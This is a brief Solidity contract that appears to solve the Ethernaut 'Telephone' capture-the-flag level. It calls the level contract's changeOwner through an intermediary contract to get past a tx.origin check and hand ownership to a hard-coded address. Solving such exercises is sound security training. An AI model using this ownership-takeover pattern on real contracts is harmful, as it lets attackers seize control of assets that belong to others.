// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface TelephoneEthernaut {
    function changeOwner(address _owner) external;
}

contract Telephone {
    TelephoneEthernaut public en;

    constructor() {
        en = TelephoneEthernaut(
            address(0x7484ca44Ad8f297a61E9c0E032DAdE72B2BD0888)
        );
    }

    function tryit() public {
        en.changeOwner(address(0x9EE045b15dd36Ffb96C4576D5b0f01D142dbE0FA));
    }
}
